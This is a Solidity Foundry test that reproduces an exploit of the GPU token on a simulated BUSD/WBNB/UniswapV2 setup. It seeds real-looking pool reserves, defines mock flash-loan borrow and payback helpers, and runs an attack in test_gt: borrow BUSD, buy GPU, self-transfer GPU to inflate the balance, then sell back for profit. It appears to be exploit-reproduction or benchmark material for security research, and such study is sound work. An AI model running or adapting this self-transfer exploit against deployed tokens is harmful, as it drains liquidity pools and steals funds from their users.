// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {BUSD} from "@utils/BUSD.sol";
import {GPU} from "./GPU.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract GPUTestBase is Test, BlockLoader {
    BUSD busd;
    WBNB wbnb;
    GPU gpu;
    UniswapV2Pair busdWbnbPair;
    UniswapV2Pair busdGpuPair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address busdAddr;
    address wbnbAddr;
    address gpuAddr;
    address busdWbnbPairAddr;
    address busdGpuPairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1715162496;
    uint112 reserve0busdWbnbPair = 6218166064390696602036283;
    uint112 reserve1busdWbnbPair = 10716066967206997879194;
    uint32 blockTimestampLastbusdWbnbPair = 1715162496;
    uint256 kLastbusdWbnbPair = 66634123092406330434349519816852804054837615950;
    uint256 price0CumulativeLastbusdWbnbPair =
        1565453370575544650911712684980722289238;
    uint256 price1CumulativeLastbusdWbnbPair =
        173679652157762616629299237180633385211319952;
    uint112 reserve0busdGpuPair = 32666057895841703902864;
    uint112 reserve1busdGpuPair = 30903990987461173215594;
    uint32 blockTimestampLastbusdGpuPair = 1715157349;
    uint256 kLastbusdGpuPair = 1000000000000000000000000000000000000000000000;
    uint256 price0CumulativeLastbusdGpuPair =
        3593172380488441457328771074525154312554;
    uint256 price1CumulativeLastbusdGpuPair =
        3413984338485409116007014517744538854;
    uint256 totalSupplywbnb = 1549681071066995586766093;
    uint256 balanceOfwbnbbusdWbnbPair = 10716066967206997879194;
    uint256 balanceOfwbnbbusdGpuPair = 0;
    uint256 balanceOfwbnbattacker = 0;
    uint256 totalSupplybusd = 3979997892719565019731285863;
    uint256 balanceOfbusdbusdWbnbPair = 6218166064390696602036283;
    uint256 balanceOfbusdbusdGpuPair = 32666057895841703902864;
    uint256 balanceOfbusdattacker = 0;
    uint256 totalSupplygpu = 1000000000000000000000000;
    uint256 balanceOfgpubusdWbnbPair = 0;
    uint256 balanceOfgpubusdGpuPair = 30903990987461173215594;
    uint256 balanceOfgpuattacker = 0;

    function setUp() public {
        owner = address(this);
        busd = new BUSD();
        busdAddr = address(busd);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        gpu = new GPU(address(this), address(busd));
        gpuAddr = address(gpu);
        busdWbnbPair = new UniswapV2Pair(
            address(busd),
            address(wbnb),
            reserve0busdWbnbPair,
            reserve1busdWbnbPair,
            blockTimestampLastbusdWbnbPair,
            kLastbusdWbnbPair,
            price0CumulativeLastbusdWbnbPair,
            price1CumulativeLastbusdWbnbPair
        );
        busdWbnbPairAddr = address(busdWbnbPair);
        busdGpuPair = new UniswapV2Pair(
            address(busd),
            address(gpu),
            reserve0busdGpuPair,
            reserve1busdGpuPair,
            blockTimestampLastbusdGpuPair,
            kLastbusdGpuPair,
            price0CumulativeLastbusdGpuPair,
            price1CumulativeLastbusdGpuPair
        );
        busdGpuPairAddr = address(busdGpuPair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(busdWbnbPair),
            address(busdGpuPair),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(busdWbnbPair), balanceOfwbnbbusdWbnbPair);
        busd.transfer(address(busdWbnbPair), balanceOfbusdbusdWbnbPair);
        busd.transfer(address(busdGpuPair), balanceOfbusdbusdGpuPair);
        gpu.transfer(address(busdGpuPair), balanceOfgpubusdGpuPair);
        gpu.afterDeploy(address(router), address(busdGpuPair));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Busd Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(busd),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(busd),
            address(busd),
            busd.decimals()
        );
        queryERC20BalanceDecimals(address(gpu), address(busd), gpu.decimals());
        emit log_string("");
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(busd),
            address(wbnb),
            busd.decimals()
        );
        queryERC20BalanceDecimals(address(gpu), address(wbnb), gpu.decimals());
        emit log_string("");
        emit log_string("Gpu Balances: ");
        queryERC20BalanceDecimals(address(wbnb), address(gpu), wbnb.decimals());
        queryERC20BalanceDecimals(address(busd), address(gpu), busd.decimals());
        queryERC20BalanceDecimals(address(gpu), address(gpu), gpu.decimals());
        emit log_string("");
        emit log_string("Busdwbnbpair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(busdWbnbPair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(busd),
            address(busdWbnbPair),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(gpu),
            address(busdWbnbPair),
            gpu.decimals()
        );
        emit log_string("");
        emit log_string("Busdgpupair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(busdGpuPair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(busd),
            address(busdGpuPair),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(gpu),
            address(busdGpuPair),
            gpu.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attacker),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(busd),
            address(attacker),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(gpu),
            address(attacker),
            gpu.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return busd.balanceOf(attacker) >= 1e18 + balanceOfbusdattacker;
    }

    function borrow_wbnb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_owner(uint256 amount) internal eurus {
        wbnb.transfer(owner, amount);
    }

    function borrow_busd_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_busd_owner(uint256 amount) internal eurus {
        busd.transfer(owner, amount);
    }

    function borrow_gpu_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        gpu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_gpu_owner(uint256 amount) internal eurus {
        gpu.transfer(owner, amount);
    }

    function borrow_wbnb_busdWbnbPair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(busdWbnbPair));
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_busdWbnbPair(uint256 amount) internal eurus {
        wbnb.transfer(address(busdWbnbPair), amount);
    }

    function borrow_busd_busdWbnbPair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(busdWbnbPair));
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_busd_busdWbnbPair(uint256 amount) internal eurus {
        busd.transfer(address(busdWbnbPair), amount);
    }

    function borrow_gpu_busdWbnbPair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(busdWbnbPair));
        gpu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_gpu_busdWbnbPair(uint256 amount) internal eurus {
        gpu.transfer(address(busdWbnbPair), amount);
    }

    function borrow_wbnb_busdGpuPair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(busdGpuPair));
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_busdGpuPair(uint256 amount) internal eurus {
        wbnb.transfer(address(busdGpuPair), amount);
    }

    function borrow_busd_busdGpuPair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(busdGpuPair));
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_busd_busdGpuPair(uint256 amount) internal eurus {
        busd.transfer(address(busdGpuPair), amount);
    }

    function borrow_gpu_busdGpuPair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(busdGpuPair));
        gpu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_gpu_busdGpuPair(uint256 amount) internal eurus {
        gpu.transfer(address(busdGpuPair), amount);
    }

    function swap_busdWbnbPair_attacker_busd_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        busd.transfer(address(busdWbnbPair), amount);
        busdWbnbPair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_busdWbnbPair_attacker_wbnb_busd(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(busdWbnbPair), amount);
        busdWbnbPair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_busdGpuPair_attacker_busd_gpu(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        busd.transfer(address(busdGpuPair), amount);
        busdGpuPair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_busdGpuPair_attacker_gpu_busd(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        gpu.transfer(address(busdGpuPair), amount);
        busdGpuPair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(10**24 + 18 * 30 * 86400);
        borrow_busd_owner(22_600 ether);
        printBalance("After step0 ");
        swap_busdGpuPair_attacker_busd_gpu(
            22_400 ether,
            busdGpuPair.getAmountOut(22_400 ether, address(busd))
        );
        printBalance("After step1 ");
        for(uint256 i=0; i<1; i++) {
            gpu.transfer(address(attacker), gpu.balanceOf(address(attacker)));
            // busdGpuPair.swap(1, 0, attacker, new bytes(0));
        }
        printBalance("After step2 ");
        swap_busdGpuPair_attacker_gpu_busd(
            gpu.balanceOf(address(attacker)),
            busdGpuPair.getAmountOut(gpu.balanceOf(address(attacker)), address(gpu)) * 9/10
        );
        printBalance("After step3 ");
        
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt1 >= amt0);
        borrow_busd_owner(amt0);
        swap_busdGpuPair_attacker_busd_gpu(amt1, amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
